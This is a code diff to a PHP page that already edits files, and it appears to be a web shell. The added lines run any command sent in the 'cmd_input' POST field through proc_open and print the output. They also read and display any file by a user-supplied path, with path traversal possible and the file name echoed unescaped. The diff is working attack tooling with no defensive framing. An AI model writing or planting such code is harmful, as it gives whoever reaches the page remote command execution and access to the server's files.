@@ -206,7 +206,38 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 echo '<hr>Error: Failed to edit file!';
             }
         }
+    } elseif (isset($_POST['cmd_input'])) {
+        $command = $_POST['cmd_input'];
+        $descriptorspec = [
+            0 => ['pipe', 'r'],
+            1 => ['pipe', 'w'],
+            2 => ['pipe', 'w']
+        ];
+        $process = proc_open($command, $descriptorspec, $pipes);
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            $errors = stream_get_contents($pipes[2]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+            if (!empty($errors)) {
+                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($errors) . '</textarea>';
+            } else {
+                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . htmlspecialchars($output) . '</textarea>';
+            }
+        } else {
+            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
+        }
+    } elseif (isset($_POST['view_file'])) {
+        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
+        if (file_exists($fileToView)) {
+            $fileContent = file_get_contents($fileToView);
+            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
+        } else {
+            $viewCommandResult = '<hr><p>Error: File not found!</p>';
+        }
     }
+}
 
 echo '<center>
 <div class="fig-ansi">
